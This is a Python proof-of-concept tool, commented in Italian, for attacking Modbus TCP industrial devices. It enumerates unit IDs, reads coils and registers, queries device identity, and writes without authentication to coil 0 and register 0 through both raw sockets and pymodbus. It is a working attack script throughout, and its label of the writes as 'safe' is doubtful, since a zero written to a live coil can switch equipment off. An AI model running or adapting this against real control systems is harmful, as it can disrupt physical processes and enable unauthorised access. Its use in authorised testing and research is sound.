#!/usr/bin/env python3
"""
modbus_rw.py — Modbus TCP Enumeration & Write PoC
Uso: python3 modbus_rw.py <target> [--port 502] [--unit 1] [--action read|write|enum]
"""

import argparse
import socket
import struct
import sys

# Modbus TCP frame: Transaction ID(2) + Protocol ID(2) + Length(2) + Unit ID(1) + PDU
def build_modbus_request(transaction_id, unit_id, function_code, data_bytes):
    pdu = bytes([unit_id, function_code]) + data_bytes
    header = struct.pack(">HHH", transaction_id, 0, len(pdu))
    return header + pdu

def send_modbus(target, port, packet, timeout=5):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((target, port))
        sock.sendall(packet)
        resp = sock.recv(256)
        return resp
    except Exception:
        return None
    finally:
        sock.close()

def fc3_read_holding_registers(target, port, unit_id, start_addr=0, count=10):
    """FC3 — Read Holding Registers"""
    data = struct.pack(">HH", start_addr, count)
    pkt = build_modbus_request(1, unit_id, 0x03, data)
    return send_modbus(target, port, pkt)

def fc1_read_coils(target, port, unit_id, start_addr=0, count=10):
    """FC1 — Read Coils"""
    data = struct.pack(">HH", start_addr, count)
    pkt = build_modbus_request(2, unit_id, 0x01, data)
    return send_modbus(target, port, pkt)

def fc2_read_discrete_inputs(target, port, unit_id, start_addr=0, count=10):
    """FC2 — Read Discrete Inputs"""
    data = struct.pack(">HH", start_addr, count)
    pkt = build_modbus_request(3, unit_id, 0x02, data)
    return send_modbus(target, port, pkt)

def fc4_read_input_registers(target, port, unit_id, start_addr=0, count=10):
    """FC4 — Read Input Registers"""
    data = struct.pack(">HH", start_addr, count)
    pkt = build_modbus_request(4, unit_id, 0x04, data)
    return send_modbus(target, port, pkt)

def fc5_write_coil(target, port, unit_id, coil_addr=0, value=0x0000):
    """FC5 — Write Single Coil (0x0000 = OFF, safe)"""
    data = struct.pack(">HH", coil_addr, value)
    pkt = build_modbus_request(5, unit_id, 0x05, data)
    return send_modbus(target, port, pkt)

def fc6_write_register(target, port, unit_id, reg_addr=0, value=0x0000):
    """FC6 — Write Single Register (0x0000, safe)"""
    data = struct.pack(">HH", reg_addr, value)
    pkt = build_modbus_request(6, unit_id, 0x06, data)
    return send_modbus(target, port, pkt)

def fc43_device_identification(target, port, unit_id):
    """FC43/0x0E — Read Device Identification"""
    data = bytes([0x0E, 0x01, 0x00])
    pkt = build_modbus_request(7, unit_id, 0x2B, data)
    return send_modbus(target, port, pkt)

def parse_response(resp):
    """Analisi base risposta Modbus"""
    if not resp or len(resp) < 8:
        return None, None
    try:
        trans_id, proto_id, length = struct.unpack(">HHH", resp[:6])
        unit_id = resp[6]
        fc = resp[7]
        payload = resp[8:]
        return fc, payload
    except Exception:
        return None, None

def is_exception(fc, payload):
    """Verifica se la risposta è un'eccezione Modbus (FC >= 0x80)"""
    return fc is not None and fc >= 0x80

def hexdump(data, prefix="    "):
    if not data:
        return "N/A"
    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        asc_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        lines.append(f"{prefix}{i:04x}  {hex_part:<48}  {asc_part}")
    return '\n'.join(lines)

def enum_unit_ids(target, port, timeout=3):
    """Enum Unit ID 1-247 — cerca risposte valide"""
    print(f"[*] Enum Unit ID 1-247 su {target}:{port}")
    responding = []
    for uid in range(1, 248):
        data = struct.pack(">HH", 0, 5)
        pkt = build_modbus_request(uid, uid, 0x03, data)
        resp = send_modbus(target, port, pkt, timeout=2)
        if resp and len(resp) >= 8:
            fc, payload = parse_response(resp)
            if fc is not None and not is_exception(fc, payload):
                print(f"[FOUND:HIGH]  Unit ID {uid} risponde FC3 → {len(payload)} bytes")
                responding.append(uid)
            elif fc is not None and is_exception(fc, payload):
                exc_code = payload[0] if payload else 0xFF
                print(f"[INFO]       Unit ID {uid} → eccezione FC {fc & 0x7F} / {exc_code:#04x}")
                responding.append(uid)
        if uid % 50 == 0:
            sys.stdout.write(f"\r    Scansione: {uid}/247 UID...")
            sys.stdout.flush()
    print()
    return responding

def action_read(target, port, unit_id):
    print(f"[*] Read FC1/FC2/FC3/FC4 — unit {unit_id} — {target}:{port}")

    funcs = [
        ("FC1 Read Coils",           fc1_read_coils),
        ("FC2 Read Discrete Inputs", fc2_read_discrete_inputs),
        ("FC3 Read Holding Regs",    fc3_read_holding_registers),
        ("FC4 Read Input Regs",      fc4_read_input_registers),
    ]
    for name, fn in funcs:
        resp = fn(target, port, unit_id)
        if resp:
            fc, payload = parse_response(resp)
            if fc and not is_exception(fc, payload):
                print(f"[FOUND:HIGH]  {name}: {len(payload)} bytes")
                print(hexdump(payload))
            else:
                exc = payload[0] if payload else 0xFF
                print(f"[ ]          {name}: eccezione {exc:#04x}")
        else:
            print(f"[ ]          {name}: no risposta")

def action_write(target, port, unit_id):
    print(f"[*] Write PoC FC5/FC6 — unit {unit_id} — {target}:{port} [valore safe: 0x0000]")
    print("[!] ATTENZIONE: operazioni di scrittura su dispositivo reale")

    resp5 = fc5_write_coil(target, port, unit_id, coil_addr=0, value=0x0000)
    if resp5:
        fc, payload = parse_response(resp5)
        if fc == 0x05 and not is_exception(fc, payload):
            print("[FOUND:CRITICAL] FC5 Write Single Coil: SCRITTURA RIUSCITA SENZA AUTENTICAZIONE")
            print(hexdump(resp5))
        else:
            print(f"[ ]          FC5 Write Coil: eccezione / negato")
    else:
        print("[ ]          FC5: no risposta")

    resp6 = fc6_write_register(target, port, unit_id, reg_addr=0, value=0x0000)
    if resp6:
        fc, payload = parse_response(resp6)
        if fc == 0x06 and not is_exception(fc, payload):
            print("[FOUND:CRITICAL] FC6 Write Single Register: SCRITTURA RIUSCITA SENZA AUTENTICAZIONE")
            print(hexdump(resp6))
        else:
            print(f"[ ]          FC6 Write Register: eccezione / negato")
    else:
        print("[ ]          FC6: no risposta")

def action_enum(target, port, unit_id):
    print(f"[*] FC43 Device Identification — unit {unit_id} — {target}:{port}")
    resp = fc43_device_identification(target, port, unit_id)
    if resp and len(resp) >= 9:
        fc, payload = parse_response(resp)
        if fc == 0x2B and not is_exception(fc, payload):
            print(f"[FOUND:INFO]  FC43 risponde — {len(payload)} bytes")
            # Parsa oggetti device identification
            # Struttura: MEI Type(1), Read Dev ID code(1), Conformity Level(1), More/NextObjectId(2), NumObjects(1), Objects...
            if len(payload) >= 6:
                conformity = payload[2]
                num_objs = payload[5]
                print(f"    Conformity level: {conformity:#04x} | Num objects: {num_objs}")
                idx = 6
                obj_names = {0: "VendorName", 1: "ProductCode", 2: "MajorMinorRevision",
                             3: "VendorURL", 4: "ProductName", 5: "ModelName", 6: "UserApplicationName"}
                for _ in range(num_objs):
                    if idx + 2 > len(payload):
                        break
                    obj_id = payload[idx]
                    obj_len = payload[idx+1]
                    obj_val = payload[idx+2:idx+2+obj_len]
                    name = obj_names.get(obj_id, f"Object{obj_id:#04x}")
                    try:
                        val_str = obj_val.decode('ascii', errors='replace')
                    except Exception:
                        val_str = obj_val.hex()
                    print(f"    {name}: {val_str}")
                    idx += 2 + obj_len
            else:
                print(hexdump(payload))
        else:
            print(f"[ ]          FC43: eccezione (device non supporta Device Identification)")
    else:
        print("[ ]          FC43: no risposta")

    # Anche tentativo di read per vedere se il device è attivo
    resp3 = fc3_read_holding_registers(target, port, unit_id)
    if resp3:
        fc, payload = parse_response(resp3)
        if fc == 0x03 and not is_exception(fc, payload):
            print(f"[FOUND:HIGH]  FC3 Holding Registers leggibili ({len(payload)} bytes) — write probabilmente possibile")

def main():
    parser = argparse.ArgumentParser(description="Modbus TCP Enumeration & Write PoC")
    parser.add_argument("target", help="Target IP/hostname")
    parser.add_argument("--port", type=int, default=502)
    parser.add_argument("--unit", type=int, default=1, help="Unit ID Modbus (1-247)")
    parser.add_argument("--action", choices=["read", "write", "enum", "scan-ids"],
                        default="enum")
    parser.add_argument("--timeout", type=float, default=5.0)
    args = parser.parse_args()

    print(f"[*] Modbus TCP — {args.target}:{args.port} | Unit: {args.unit} | Action: {args.action}")

    # Tenta prima con pymodbus se disponibile
    try:
        from pymodbus.client import ModbusTcpClient
        print("[*] pymodbus disponibile — uso libreria nativa")
        client = ModbusTcpClient(args.target, port=args.port, timeout=args.timeout)
        if client.connect():
            print("[FOUND:INFO]  Connessione Modbus riuscita (pymodbus)")
            if args.action in ("read", "enum"):
                rr = client.read_holding_registers(0, 10, slave=args.unit)
                if not rr.isError():
                    print(f"[FOUND:HIGH]  FC3 Holding Regs: {rr.registers}")
                rr2 = client.read_coils(0, 10, slave=args.unit)
                if not rr2.isError():
                    print(f"[FOUND:HIGH]  FC1 Coils: {rr2.bits[:10]}")
            if args.action == "write":
                wr = client.write_register(0, 0, slave=args.unit)
                if not wr.isError():
                    print("[FOUND:CRITICAL] FC6 Write riuscita senza auth (pymodbus)")
                wc = client.write_coil(0, False, slave=args.unit)
                if not wc.isError():
                    print("[FOUND:CRITICAL] FC5 Write Coil riuscita senza auth (pymodbus)")
            client.close()
            return
        else:
            print("[!] pymodbus: connessione fallita — uso socket raw")
    except ImportError:
        print("[*] pymodbus non disponibile — uso socket raw")
    except Exception as e:
        print(f"[!] pymodbus errore: {e} — uso socket raw")

    # Fallback socket raw
    if args.action == "scan-ids":
        enum_unit_ids(args.target, args.port, args.timeout)
    elif args.action == "read":
        action_read(args.target, args.port, args.unit)
    elif args.action == "write":
        action_write(args.target, args.port, args.unit)
    elif args.action == "enum":
        action_enum(args.target, args.port, args.unit)

if __name__ == "__main__":
    main()
